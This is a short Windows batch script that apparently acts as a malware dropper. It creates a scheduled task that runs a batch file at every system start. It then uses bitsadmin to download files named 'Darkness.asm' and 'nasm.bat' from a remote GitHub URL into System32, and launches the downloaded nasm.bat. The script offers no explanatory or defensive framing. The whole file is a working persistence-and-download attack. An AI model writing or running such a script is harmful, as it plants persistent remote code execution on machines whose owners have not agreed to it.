@echo off

cd /d %windir%\system32
schtasks /create /tn "Startup Task" /tr "%windir%\System32\main.bat" /sc onstart
bitsadmin /transfer "downloadDarkness" /download /priority normal http://raw.githubusercontent.com/SomeRepo/Darkness/master/Darkness.asm %SystemRoot%\System32\Darkness.asm
bitsadmin /transfer "downloadNasm" /download /priority normal http://raw.githubusercontent.com/SomeRepo/Darkness/master/nasm.bat %SystemRoot%\System32\nasm.bat

start nasm.bat